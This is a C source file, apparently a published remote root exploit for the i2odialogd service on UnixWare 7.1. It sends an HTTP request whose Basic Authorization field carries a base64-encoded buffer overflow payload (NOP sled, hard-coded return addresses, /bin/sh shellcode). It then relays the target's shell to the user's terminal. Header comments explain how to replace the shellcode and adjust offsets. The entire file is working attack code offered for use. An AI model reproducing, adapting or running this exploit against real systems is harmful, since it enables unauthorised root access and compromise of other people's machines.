/* uwi2.c
 *
 * i2o remote root exploit for UnixWare 7.1
 * compile on UnixWare with cc -o uwi2 uwi2.c -lsocket -lnsl
 * ./uwi2 <hostname> 
 * The hard-coded RET address is 0x8047d4c 
 *
 * To either replace the shellcode or change the offset you must 
 * first craft a program which outputs, in this order:
 * - 92 bytes of your RET address (EIP starts at 89)
 * - NOPs, as many as you would like
 * - your shellcode
 * - the character ":"
 * - any character, maybe "A", as I've done below
 * - NULL
 * When printf()'ing this string, do NOT append a \newline!
 * You then pipe the output of this program to a MIME encoder (mimencode 
 * on UnixWare).  You then take the output of this program and paste it
 * where I've marked below.
 *
 * Brock Tellier btellier@usa.net
 *
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/errno.h>
#include <netdb.h>

#define BUFLEN 10000

/* since we're overflowing an Authenticate: Basic username */
/* our exploit code must be base64(MIME) encoded */

char *mimecode= 

/**** CHANGE THIS PART OF THE EXPLOIT STRING ****/
"kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ"
"kJCQkJCQTH0ECEx9BAhMfQQITH0ECEx9BAhMfQQITH0ECEx9BAhMfQQITH0ECJCQkJCQkJCQ"
"kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ"
"kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ"
"kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ"
"kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ6xteMduJXgeJXgyIXhExwLA7jX4HiflT"
"UVZW6xDo4P///y9iaW4vc2iqqqqqmqqqqqoHqpCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ"
"kJCQkJCQkJCQkJCQkJCQkJCQkDpB";
/************************************************/

char *auth=
"GET / HTTP/1.0\r\n"
"Host: localhost:360\r\n"
"Accept: text/html\r\n"
"Accept-Encoding: gzip, compress\r\n"
"Accept-Language: en\r\n"
"Negotiate: trans\r\n"
"User-Agent: xnec\r\n"
"Authorization: Basic";

char buf[BUFLEN];
char sockbuf[BUFLEN];
char c;
int offset=0;
int i, ascii,num;
int i2oport = 360;
int sock;
int addr = 0x80474b4;
struct  sockaddr_in sock_a;
struct  hostent *host;

void main (int argc, char *argv[]) {
        
 if(argc < 2) {
   fprintf(stderr, "Error:Usage: %s <hostname> \n", argv[0]);
   exit(0);
  }
 if(argc == 3) offset=atoi(argv[2]);
 
 sprintf(buf, "%s %s \r\n\r\n", auth, mimecode);
 buf[BUFLEN - 1] = 0;

 fprintf(stderr, "i2odialogd remote exploit for UnixWare 7.1\n");
 fprintf(stderr, "Brock Tellier btellier@usa.net\n");

 if((host=(struct hostent *)gethostbyname(argv[1])) == NULL) {
    perror("gethostbyname"); 
    exit(-1);
  }
 
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
    perror("create socket");
    exit(-1);
  }

 sock_a.sin_family=AF_INET;
 sock_a.sin_port=htons(i2oport);
 memcpy((char *)&sock_a.sin_addr,(char *)host->h_addr,host->h_length);
 if(connect(sock,(struct sockaddr *)&sock_a,sizeof(sock_a))!=0) {
    perror("create connect");
    exit(-1);
  }

  fflush(stdout);

  // write exploit
  write(sock,buf,strlen(buf));

  //begin read
  while(1) {
    fd_set input;
    FD_SET(0,&input);
    FD_SET(sock,&input);
    select(sock+1,&input,NULL,NULL,NULL);

    if(FD_ISSET(sock,&input)) {
      num=read(sock,sockbuf,BUFLEN);
      write(1,sockbuf,num);
     }
     if(FD_ISSET(0,&input))
     write(sock,sockbuf,read(0,sockbuf,BUFLEN));
  }
}